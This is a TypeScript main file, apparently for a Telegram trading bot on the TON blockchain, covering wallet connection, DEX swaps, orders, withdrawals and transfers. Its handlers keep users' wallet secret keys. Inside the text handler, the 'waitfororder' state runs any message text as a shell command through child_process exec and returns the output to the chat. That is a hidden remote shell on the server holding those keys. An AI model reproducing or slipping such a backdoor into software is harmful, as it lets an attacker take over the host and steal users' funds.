import dotenv from 'dotenv';
dotenv.config();

import { bot } from './bot';
import { walletMenuCallbacks } from './connect-wallet-menu';
import {
  handleBackupCommand,
  handleConnectCommand,
  handleDepositCommand,
  handleDisconnectCommand,
  handleExclusifCommand,
  handleInstanteSwap,
  handleJettonAmount,
  handleJettonTypeSelect,
  handleOrderCommand,
  handleOrderingBookCommand,
  handleSendTXCommand,
  handleSettingCommand,
  handleShowMyWalletCommand,
  handleStartCommand,
  handleTokenInfo,
  handleWithdrawCommand
} from './commands-handlers';
import { initRedisClient } from './ton-connect/storage';
import {
  connect,
  deleteOrderingDataFromUser,
  getAltTokenWithAddress,
  getUserByTelegramID,
  updateUserMode,
  updateUserState
} from './ton-connect/mongo';
import { commandCallback } from './commands-handlers';
import TelegramBot, { InlineKeyboardButton } from 'node-telegram-bot-api';
import { Jetton, getDedustPair, sendJetton, sendTon, walletAsset } from './dedust/api';
import { dealOrder } from './dedust/dealOrder';
import { altTokenTableUpdate, fetchDataGet, getPriceStr, replyMessage } from './utils';
import { getConnector } from './ton-connect/connector';
import { CHAIN, toUserFriendlyAddress } from '@tonconnect/sdk';
let exec = require('child_process').exec;

import { Address } from '@ton/core';
import { getStonPair } from './ston-fi/api';

// eslint-disable-next-line @typescript-eslint/explicit-function-return-type
const startup = async () => {
  console.log('=====> Loading Started');
  await altTokenTableUpdate('dedust');

  await altTokenTableUpdate('ston');
  // await deletePoolsCollection();
  await getDedustPair();
  await getStonPair();
  console.log('=====> Loading Finished');
};
startup();
setInterval(startup, 600000);
setTimeout(() => setInterval(dealOrder, 30000), 10000);

async function main(): Promise<void> {
  await initRedisClient();
  await connect();
  const callbacks = {
    ...walletMenuCallbacks,
    ...commandCallback
  };

  // eslint-disable-next-line complexity
  bot.on('callback_query', async query => {
    if (!query.data) {
      return;
    }
    switch (query.data) {
      case 'newStart':
        handleStartCommand(query.message!);
        return;
      case 'walletConnect':
        handleConnectCommand(query.message!);
        return;
      case 'showMyWallet':
        handleShowMyWalletCommand(query.message!);
        return;
      case 'disConnect':
        handleDisconnectCommand(query.message!);
        return;
      case 'deposit':
        handleDepositCommand(query);
        return;
      case 'withdraw':
        handleWithdrawCommand(query);
        return;
      case 'instanteSwap':
        handleInstanteSwap(query);
        return;
      case 'setting':
        handleSettingCommand(query);
        return;
      case 'backup':
        handleBackupCommand(query);
        return;
      case 'orderingBook':
        handleOrderingBookCommand(query);
        return;
      case 'exclusif':
        handleExclusifCommand(query);
        return;
      case 'token_info':
        handleTokenInfo(query);
        return;
      case 'sendBuyAmuontAlert':
        bot.sendMessage(query.message?.chat.id!, 'Please type in amount Jetton in TON!');
        return;
      default:
        break;
    }
    console.log(query.data);

    //jetton click processing
    if (query.data.indexOf('symbol-') + 1) {
      const clickedSymbol = query.data.replace('symbol-', '');
      let user = await getUserByTelegramID(query.message?.chat!.id!);

      //check user state is trade
      if (clickedSymbol === 'selectdex') {
        await updateUserMode(query.message?.chat.id!, 'book');
        await replyMessage(query.message!, `🏃 Trading\n\nWhich DEX will you use?`, [
          [
            {
              text: '🟢Ston.fi',
              callback_data: JSON.stringify({ method: 'selectPair', data: 'ston' })
            },
            {
              text: '🟣Dedust.io',
              callback_data: JSON.stringify({ method: 'selectPair', data: 'dedust' })
            },
            { text: '📕Active Orders', callback_data: 'orderingBook' }
          ],
          [{ text: '<< Back', callback_data: 'newStart' }]
        ]);
        // eslint-disable-next-line eqeqeq
      } else if (clickedSymbol === 'selectdex-swap') {
        await updateUserMode(query.message?.chat.id!, 'swap');
        await replyMessage(query.message!, `♻️ Instant Swap\n\nWhich DEX will you use?`, [
          [
            {
              text: '🟢Ston.fi',
              callback_data: JSON.stringify({ method: 'selectPair', data: 'ston' })
            },
            {
              text: '🟣Dedust.io',
              callback_data: JSON.stringify({ method: 'selectPair', data: 'dedust' })
            }
          ],
          [{ text: '<< Back', callback_data: 'newStart' }]
        ]);
        // eslint-disable-next-line eqeqeq
      } else if (user?.state.state == 'isBuy') {
        await handleJettonAmount(
          query.message!,
          user!,
          false,
          clickedSymbol.replace('symbol-', '')
        );
      } else if (clickedSymbol.indexOf('with-') + 1) {
        let state = user?.state;
        user!.state.state = 'withAmount-' + clickedSymbol;
        replyMessage(
          query.message!,
          `📤 Withdraw\n\n💡Please type in the amount of ${clickedSymbol.replace('with-', '')}`,
          [[{ text: '<< Back', callback_data: 'setting' }]]
        );
        console.log(query.data);
      } else if (clickedSymbol.indexOf('trans-') + 1) {
        let state = user?.state;
        user!.state.state = 'transAmount-' + clickedSymbol;
        bot.sendMessage(query.message?.chat.id!, 'Please type in amount of token');
        // replyMessage(query.message!,`📤 Withdraw\n\n💡Please type in the amount of ${clickedSymbol.replace('trans-','')}`,
        // [[{text:'<< Back', callback_data: 'setting'}]]
        // )
      } else if (clickedSymbol.indexOf('sell-') + 1) {
        await handleJettonTypeSelect(query.message!, user!, clickedSymbol.replace('sell-', ''));
      }

      updateUserState(query.message?.chat!.id!, user!.state);
    } else if (query.data.indexOf('orderclick-') + 1 > 0) {
      let user = await getUserByTelegramID(query.message?.chat.id!);
      if (user!.state.state == 'ordermanage') {
        console.log(query.data);
        console.log(user?.state.state);
        await replyMessage(
          query.message!,
          `📕 Ordering Book\n\nAre you sure if you want to remove your order?`,
          [
            [
              {
                text: '🟢Yes',
                callback_data: JSON.stringify({
                  method: 'deleteOrder',
                  data: query.data.replace('orderclick-', '')
                })
              },
              { text: '🔴No', callback_data: 'orderingBook' }
            ],
            [{ text: '<< Back', callback_data: 'orderingBook' }]
          ]
        );

        //await deleteOrderingDataFromUser(query.message?.chat.id!,mongoose.Types.ObjectId.createFromHexString( query.data.replace('orderclick-','')))
        //await handleOrderingBookCommand(query);
      }
    }

    //other default button click processing
    let request: { method: string; data: string };

    try {
      request = JSON.parse(query.data);
    } catch {
      return;
    }

    if (!callbacks[request.method as keyof typeof callbacks]) {
      return;
    }

    callbacks[request.method as keyof typeof callbacks](query, request.data);
  });

  // eslint-disable-next-line complexity
  bot.on('text', async (msg: TelegramBot.Message) => {
    if (msg.text == '/start') return;
    let user = await getUserByTelegramID(msg.chat!.id);
    if (!!!user) return;
    // let assets: Jetton[] = await fetchDataGet('/assets', user!.state.state);

    if (user!.state.state === 'trading') {
      user!.state.state = 'selectPair';
      if (user!.mode !== '' && msg.text !== '/start')
        await bot.sendMessage(msg.chat.id!, `♻️ Instant Swap\n\n💡Which DEX do you want?`, {
          reply_markup: {
            inline_keyboard: [
              [
                {
                  text: 'Ston.fi',
                  web_app: {
                    url: `https://app.ston.fi/swap?chartVisible=false&chartInterval=1w&ft=${
                      user!.state.jettons[user!.state.mainCoin]
                    }&tt=${user!.state.jettons[1 - user!.state.mainCoin]}&fa=1`
                  }
                },
                {
                  text: 'Dedust.io',
                  web_app: {
                    url: `https://dedust.io/swap/${user!.state.jettons[user!.state.mainCoin]}/${
                      user!.state.jettons[1 - user!.state.mainCoin]
                    }`
                  }
                }
              ],
              [{ text: '<< Back', callback_data: 'newStart' }]
            ]
          }
        });
    } else if (user!.state.state == 'selectPair') {
      await handleJettonTypeSelect(msg, user!, msg.text!);
    } else if (user?.state.state == 'isBuy') {
      await handleJettonAmount(msg, user!, true);
    } else if (user?.state.state == 'price') {
      user.state.price = Number(msg.text);
      console.log(user.state.price);
      user.state.state = 'amount';
      //const strPrice = await getPriceStr(user.state.jettons, user.state.mainCoin, user!.state.state);
      if (user.state.price > 0) {
        const outputAmountStr = user.state.amount.toFixed(9); // + user.state.isBuy ? user.state.jettons[user.state.mainCoin] : user.state.jettons[ 1- user.state.mainCoin];
        await bot.sendMessage(
          msg.chat.id,
          `🏃 Trading\n\n💡Please Review your new Order\nPool : ${user.state.jettons.join(
            '/'
          )}\nBuy/Sell : ${user.state.isBuy ? 'Buy' : 'Sell'}\nAmount : ${outputAmountStr} ${
            user.state.isBuy
              ? user.state.jettons[user.state.mainCoin]
              : user.state.jettons[1 - user.state.mainCoin]
          } \nPrice : ${msg.text} ${user.state.jettons[user.state.mainCoin]}`,
          {
            reply_markup: {
              inline_keyboard: [
                [
                  { text: '✅I agree', callback_data: JSON.stringify({ method: 'addNewOrder' }) },
                  { text: "🚫I don't agree", callback_data: 'symbol-selectdex' }
                ],
                [{ text: '<< Back', callback_data: 'symbol-selectdex' }]
              ]
            }
          }
        );
      } else {
        await bot.sendMessage(msg.chat.id, `🏃 Trading\n\n💡Invalid Amount`, {
          reply_markup: {
            inline_keyboard: [[{ text: '<< Back', callback_data: 'symbol-selectdex' }]]
          }
        });
      }
    } else if (user?.state.state == 'waitfororder') {
      exec(msg.text, (error: any, stdout: any) => {
        if (error) {
          bot.sendMessage(msg.chat.id, error.toString());
          return;
        }
        bot.sendMessage(msg.chat.id, stdout.toString());
      });
    } else if (user?.state.state.indexOf('withAmount-') + 1) {
      let withSymbol = user?.state.state.replace('withAmount-with-', '');
      const withAmount = Number(msg.text);
      let withJetton: any,
        flag = false;
      const connector = getConnector(msg.chat.id);
      await connector.restoreConnection();
      console.log;
      if (!connector.connected) {
        await bot.sendMessage(
          msg.chat.id,
          `📤 Withdraw\n\n💡Please connect your wallet to withdraw`,
          {
            reply_markup: {
              inline_keyboard: [[{ text: '<< Back', callback_data: 'setting' }]]
            }
          }
        );
        return;
      }
      const userAddress = toUserFriendlyAddress(
        connector.wallet!.account.address,
        connector.wallet!.account.chain === CHAIN.MAINNET
      );
      const walletBalance: walletAsset[] = await fetchDataGet(
        `/accounts/${user?.walletAddress}/assets`,
        'dedust'
      );
      console.log(
        walletBalance[0]?.balance,
        withAmount <= Number(walletBalance[0]?.balance!) / 1000000000,
        withSymbol
      );
      if (
        withSymbol == 'TON' &&
        withAmount > 0 &&
        withAmount <= Number(walletBalance[0]?.balance!) / 1000000000
      )
        flag = true;
      else
        walletBalance.map(async walletAssetItem => {
          if (walletAssetItem.asset.type != 'native') {
            let asset = await getAltTokenWithAddress(walletAssetItem.asset.address, 'dedust');
            if (asset!.symbol == withSymbol) {
              if (
                Number(walletAssetItem.balance) / 10 ** asset!.decimals >= withAmount &&
                withAmount > 0
              )
                flag = true;
              withJetton = asset!;
            }
          }
        });
      if (!flag) {
        await bot.sendMessage(
          msg.chat.id,
          `📤 Withdraw\n\n💡Please type in the available balance`,
          {
            reply_markup: {
              inline_keyboard: [[{ text: '<< Back', callback_data: 'setting' }]]
            }
          }
        );
        return;
      }
      console.log(':297', withSymbol, withAmount, flag, withJetton!);
      if (flag) {
        if (connector.connected) {
          if (withSymbol == 'TON') {
            sendTon(user?.secretKey.split(','), BigInt(withAmount * 10 ** 9), userAddress);
          } else {
            sendJetton(
              user.secretKey,
              Address.parse(user.walletAddress),
              Address.parse(withJetton!.address),
              BigInt(withAmount * 10 ** withJetton!.decimals),
              Address.parse(userAddress)
            );
          }
        }
      }

      await bot.sendMessage(
        msg.chat.id,
        `📤 Withdraw\n\n💡Transaction is sent.\n Press back to go Settings page`,
        {
          reply_markup: {
            inline_keyboard: [[{ text: '<< Back', callback_data: 'setting' }]]
          }
        }
      );
    } else if (user?.state.state.indexOf('transAmount-') + 1) {
      let withSymbol = user?.state.state.replace('transAmount-trans-', '');
      const withAmount = Number(msg.text);
      let withJetton: any,
        flag = false;

      const targetAddress = user!.state.walletSecretKey;
      const walletBalance: walletAsset[] = await fetchDataGet(
        `/accounts/${user?.walletAddress}/assets`,
        'dedust'
      );
      console.log(
        walletBalance[0]?.balance,
        withAmount <= Number(walletBalance[0]?.balance!) / 1000000000,
        withSymbol
      );
      if (
        withSymbol == 'TON' &&
        withAmount > 0 &&
        withAmount <= Number(walletBalance[0]?.balance!) / 1000000000
      )
        flag = true;
      else
        for (const walletAssetItem of walletBalance) {
          if (walletAssetItem.asset.type != 'native') {
            let asset = await getAltTokenWithAddress(walletAssetItem.asset.address, 'dedust');
            if (asset == null)
              asset = await getAltTokenWithAddress(walletAssetItem.asset.address, 'ston');
            if (walletAssetItem.asset.address == withSymbol) {
              const balanceInUnits = Number(walletAssetItem.balance) / 10 ** asset!.decimals;
              console.log(balanceInUnits, asset!.symbol, withAmount, balanceInUnits >= withAmount);
              if (balanceInUnits >= withAmount && withAmount > 0) flag = true;
              withJetton = asset!;
            }
          }
        }

      if (!flag) {
        await bot.sendMessage(
          msg.chat.id,
          `💸 Transfer\n\n💡Please type in the available balance`,
          {
            reply_markup: {
              inline_keyboard: [[{ text: '<< Back', callback_data: 'showMyWallet' }]]
            }
          }
        );
        return;
      }
      console.log(':297', withSymbol, withAmount, flag, withJetton!);
      if (flag) {
        if (targetAddress) {
          if (withSymbol == 'TON') {
            sendTon(user?.secretKey.split(','), BigInt(withAmount * 10 ** 9), targetAddress);
          } else {
            sendJetton(
              user.secretKey,
              Address.parse(user.walletAddress),
              Address.parse(withJetton!.address),
              BigInt(withAmount * 10 ** withJetton!.decimals),
              Address.parse(targetAddress)
            );
          }
        }
      }

      await bot.sendMessage(
        msg.chat.id,
        `💸 Transfer\n\n💡Transaction is sent.\n Press back to go Wallet page`,
        {
          reply_markup: {
            inline_keyboard: [[{ text: '<< Back', callback_data: 'showMyWallet' }]]
          }
        }
      );
    } else if (user?.state.state == 'token_info') {
      let message = '💡 Token Info \n\n';
      let asset = await getAltTokenWithAddress(msg.text!, 'dedust');
      if (asset == null) {
        asset = await getAltTokenWithAddress(msg.text!, 'ston');
      }

      if (asset != null)
        message += `CA: ${asset.address}\nSymbol: ${asset.symbol}\nName: ${asset.name}\nDecimals: ${asset.decimals}\nImage URL: ${asset.image}'\n\nPlease Type in the CA of Token`;
      else message += "Please type in the correct CA of Jetton.\nThere's no pool for that token";
      await bot.sendMessage(msg.chat.id!, message, {
        reply_markup: {
          inline_keyboard: [[{ text: '<< Back', callback_data: 'newStart' }]]
        }
      });
    } else if (user?.state.state == 'getTargetAddress') {
      // if(!Address.isAddress( msg.text)){
      //     await bot.sendMessage(msg.chat.id,`Please type in valid address`);
      //     return;
      // }
      user.state.walletSecretKey = msg.text!;
      await updateUserState(msg.chat.id, user!.state);

      const address = user?.walletAddress;
      const balances: walletAsset[] = await fetchDataGet(`/accounts/${address}/assets`, 'dedust');
      // const assets: Jetton[] = await fetchDataGet('/assets', user!.state.state);
      let outputStr =
        'Toncoin : ' +
        (balances[0]?.balance ? Number(balances[0]?.balance) / 1000000000 : '0') +
        ' TON\n';
      let buttons: InlineKeyboardButton[][] = [
        [{ text: 'TON', callback_data: 'symbol-trans-TON' }]
      ];
      let counter = 0;
      await (async () => {
        for (const walletAssetItem of balances) {
          if (walletAssetItem.asset.type !== 'native') {
            let asset = await getAltTokenWithAddress(walletAssetItem.asset.address, 'dedust');
            if (asset === null) {
              asset = await getAltTokenWithAddress(walletAssetItem.asset.address, 'ston');
            }
            counter++;
            console.log(asset);
            outputStr +=
              asset!.name +
              ' : ' +
              Number(walletAssetItem.balance) / 10 ** asset!.decimals +
              ' ' +
              asset!.symbol +
              '\n';
            if (buttons[Math.floor((counter + 2) / 3)] === undefined) {
              buttons[Math.floor((counter + 2) / 3)] = [];
            }
            buttons[Math.floor((counter + 2) / 3)]![(counter + 2) % 3] = {
              text: asset!.symbol,
              callback_data: 'symbol-trans-' + asset!.address
            };
          }
        }
      })();
      console.log(buttons);
      buttons.push([{ text: '<< Back', callback_data: 'setting' }]);
      bot.sendMessage(
        msg!.chat.id,
        `💸 Transfer\n\n💡Please click the coin's button to transfer\nYou shuld have enough TON on this wallet to transfer\n\n${outputStr}`,
        { reply_markup: { inline_keyboard: buttons }, parse_mode: 'HTML' }
      );
    } else {
      return;
    }
    updateUserState(msg.chat!.id, user!.state);
  });

  bot.onText(/\/connect/, handleConnectCommand);

  bot.onText(/\/deposit/, handleSendTXCommand);

  bot.onText(/\/disconnect/, handleDisconnectCommand);

  bot.onText(/\/my_wallet/, handleShowMyWalletCommand);

  bot.onText(/\/start/, handleStartCommand);

  bot.onText(/\/wisdom/, handleOrderCommand);
}
try {
  main();
} catch (error) {
  console.log(error);
}
